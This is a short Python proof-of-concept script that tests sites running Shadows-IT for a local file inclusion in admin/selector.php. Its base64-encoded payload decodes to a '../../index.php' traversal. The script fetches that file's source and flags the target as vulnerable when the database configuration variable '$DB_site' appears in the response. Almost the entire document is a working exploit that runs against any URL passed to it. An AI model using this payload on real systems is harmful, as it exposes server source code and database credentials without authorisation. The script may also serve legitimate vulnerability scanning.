#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Shadows-IT selector.php 任意文件包含
referer: unknown
author: Lucifer
description: 文件selector.php中,参数idbase64解码可包含本地文件。
'''
import sys
import requests
import warnings
def run(url):
        result = ['Shadows-IT selector.php 任意文件包含','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/admin/selector.php?page=dXBsb2FkX2ZpbGU=&op=ZHJhd19jYXRfcGhvdG8=&id=Li4vLi4vaW5kZXgucGhw"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"$DB_site" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
